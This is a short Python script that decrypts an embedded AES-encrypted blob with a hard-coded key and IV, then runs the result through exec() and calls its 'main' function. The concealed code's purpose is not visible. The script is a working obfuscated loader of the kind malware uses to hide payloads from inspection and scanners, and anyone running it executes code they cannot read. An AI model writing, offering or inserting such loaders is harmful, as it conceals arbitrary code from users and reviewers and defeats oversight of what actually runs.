
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

def decrypt_script(encrypted_data, iv, key):
    # Create AES cipher with CBC mode
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    # Return decrypted Python code
    return decrypted_data.decode('utf-8')

def execute_decrypted_script(decrypted_code):
    # Create a new dictionary for the execution context
    exec_globals = {}
    
    # Dynamically execute the decrypted Python code in the new context
    exec(decrypted_code, exec_globals)

    # Now you can call the functions from the executed code
    # For example, if 'main' is defined in the decrypted code, it can be called as follows:
    if 'main' in exec_globals:
        exec_globals['main']()

# Example: Replace this with your actual encryption key (must be the same as used for encryption)
key = b'SW\xdeC\x91X)\xbc@\xd8Y\xf5SC\x05\xb8\x90\xee\xa8\xbe\x9b\xbc\xb7?s\xe6[{\xc2\xf0\xd0<'

# Embedded encrypted data and IV
iv = b'\xc7c\x94YM0\xb1\x1ez\xac\xf6\x87\x9f\xa3W`'  # 16 bytes IV (Initialization Vector)
encrypted_data = b'/\xe8\x998\xb2j\x92\xf9\xa1\x1a\xe6>\x9c\x1a\xf3\x1fLW)\x90\xdd\xcb\xc1-\xb7\nr\x99\x9d\xb2\x9c\xd3P\x85\xa6_\xb6\x9f_\x11R\xc9\xb4\x14\xe3\x8eBnp\xe4B\x97\xf8\xa2\xf0\xfcl\xf7\xb50y]F\xd9\xe7\xc7\x14-\xe7\xde}1\xd9\xafU\x82g\x0e\xadq1\x1c%f6\xe3\x0f\xbd\xed\x7f\xcf\xb7\x1b\xfe\xd2\x8a\n\n\x11\xf3-&\r\xdd\x198\xdaU%m\xf8)o\xf3\xcf\xfb\xe5\x8b\xdf\xfa\xa7(\x8b\xb9\x02\xe5b\x8cZ\x02\x16~\xa7\'\xfe\x90\xb1\x0f\xf7\xfbf\xebq6\xf4\xb6\x82\x8c\xdc\x10?%@4\xddM\x9b\xea\x02\xd0\x7f\xdf\xd1\xfcq8\x19\x9fF#h\xb2B\x1cL\x11hrW+\xdb\xd8\x07\xef\x15\x02{\x8a\xb1Yb\x19Ofzrv\xf1-\x9e\xa5s{\x8a\x93\\\xc8\xd6F\xfc\x95\xab\'C\x08\xd4\xb7\x02\xc8\xd2\xb2\xbc\xf3\x8b\xd9\x1b\xf4E\xa4m\xd9\xb9\x1e\xfe\xa3\x00T\x11|\xaaT&\\-(\x97\x7fB\xef10X\x8e\xe1C\xa6\xcb\x95\x0f\xc6\x00f\x0c\x06\xb8\xa2m\xe8\x059\x96jf\x8a\x10T<Yg\x1c@\x1b\xcb\x12H\xf4\xa1\xa2\x04\xe3<\xb6\n\xef.\xc94\x84\xd6\r\x84\x10\xfd\x00\xcfpAhU\x80\xdd\x97!\x9f\x9dW\xe6aK\x9c\xb9\xc4\xea;\x142\xa7\xf3j\xed\x10\x95\xdf\xe9\x83\xea\xd7\xa0\xb4\xbb+\xbd\xce\xe4\xd3{\x94\x9c\xbdS\x92T\x10\xf8\xd5\x19\xfa\xb9\x93\xf7\xfe\xc8y\xae\xe4d\x11/&\x02\xef/\xe44\x89;\xccUfX^\xd1\xba\xf9\x11\xf5 \xfe\xa5\x18\x1av$\xa8\xe5,2\x80^\x90\xb3\x80\xc9\xf75\xa6\xd6oA\x8a\xe2C\x06\xf8\x88\xa7TZ1K\xb0\x94\xb4\xe5\xa5\xd8\xec]2\xfc\xef\xe4c\xe0\xf0A\xf3X>4\xd8\xf2a%C\x9e\xc3\xec\xb0\xfe=V\xadxw\xcd\xe5\x0e%a\x81\x1b\xd9\xf71\x94\xd71-\xc8J\x11\x9ea\xdfQ\xfd\xf5\xa3C\x1b\x81h\x0f\xb6a =#Z\xd2\xb74\xe1p+9=\xf8\xf5p\xefF$~\xc1/\x8e(\x83\x8b\xfc\xa1p\xcd\x1e\xdctl\xddI4\xd3.\xb1*\xcd\xc7\x92\xb8\x89a\xd6\xd1\xe3\xd1\xa4/\xa08x\xb5K\x9cB\xce\xc8\x1a\xc8]a\xcd\xe0J\x84\xad\xa7\x96A\x19\xabz\x89L\xd7U^\xaa\x10\xdd\xdf\xff\x87\xef\xe1G\xe8\x9b\xbe\xd2\xde\xec` =u\x8caks\x0eb\xbaz\xc9\xc1i\x9f\xc6S8\xad&@\x15\xd5\xaf\xe7\xb2/N\xa0\xd1\xa1\xc9\xfb-\xb0j\x823\x85\xc0\xb6B\xfa%\xc6\x92\x802\x16\x05>\x81\xbbj1\x8f`l\xb1[\xb1\x1e0\xde\x93$`b\x7f\xe8M\xb3\xc4\xcb\x89\xfe\xccx\x9b\x83B>b\xbb;\xbc\xaa\xe6\x00*\xd6\xb3\xe4Wi\x19k"?\xb9\x92\xb5\xfa\x02\xc1\x0fB|\x97\xf74`\n\x19\xfa\x1e[\x81\x92\x01\xce\x0c\xcf\xd9I\xf3\tR\xa5\x15m\x01\xd4E\x1b+\xfb\xc0\x89oj\xbeC\xc4\xcf\xb3\x18\x1e\xdc\x9e\x88\x7f\xff%\x9f\xb6,A3\x9b\xc8\xe7\x92A\x1f\xceS\xab\xf2\xa5K\x18v\xa5\n.\x0c\x80\'\xd4\x922\\@\xb5)\x8b\xf7\x82\x15i\xd2\xda\x9f\x1b\xeaU\xb97\xd0\xaf\x80\\9\xd0z\xc7`\xd5\t\xfa\xa7\xe0\xd0\x0ci\x15\xe2\x05\x04\xe6\xb6\xd5(X\xcc\xba/WB\r\x7fo_\x80\x02\x17b\xca\rF\xfcv\x15\x8a\xd0i^5\x99\x13t\xd3\xd5D\xffP\x99\xa6-,}\xa8I\x89\x90\x18,\xb1m\xb8\xda\x90\x8b\xa9\xd9\xe2\x02\x14\x13\x17Ak\xfeM\xae\xb0\xe0\xa6\x08x\x0f\xf0\x90\xf8\xea\x99\xd6[\xff\x9ak\xd7\x97Z\x89\xfa_\x05U\x12l-z\xb4\xb4\xc5\xbd\xaf\x10?\x1d]\x11\xb0}\xb2\x18\x92 p\xcf2\x9b\x04]\xa2\x174Ue\xdf\xd4\xcb\xb7\xac\xdf\x16SFM\xb6\'\x17N\xec\xfc\x89K\xd8\x8a\xf9\x81)\x1e\xe7o\xcf9\xd2\xf5=q\xe3\x95\xbcA}rK\x9c\x07\x91\xf1d\xfe\x9fz\x1bUFK\x8f\x15\xad\xc32*\xa9z\xb7t\xb0\xb0\x046`M\x88Q\xce\x82\x92n\xdf\xff\x89\xd8\x9eQ\x9c\xca\x0f\x0e*:_l}\x05\xebw\x8a\x04\xf7\xd5\xc2\xd7\xdc~\x8a#\xe3\xcd\xadx\xb5\x1b\'o<6\xf1\x11\xdd\xa3\xc5\xe1l\xab>\xe5\xf7\xa8\x9a3b7\x03\xd6\xdb\xde\x16\xf8\xce\xc8\\+\xcb\x00\x93\xfd\x12w\x9bA+\xcfI\x8c\xc4O\x9b\xc1\xc8\x815=\xd2NN,\xcd\xad\xd0l\x14\xc05\x18\xa7r\x91\x0e\xdb\x7f\xf8S\xe5,\x94'  # This is the encrypted code

# Decrypt and execute the code
decrypted_code = decrypt_script(encrypted_data, iv, key)
execute_decrypted_script(decrypted_code)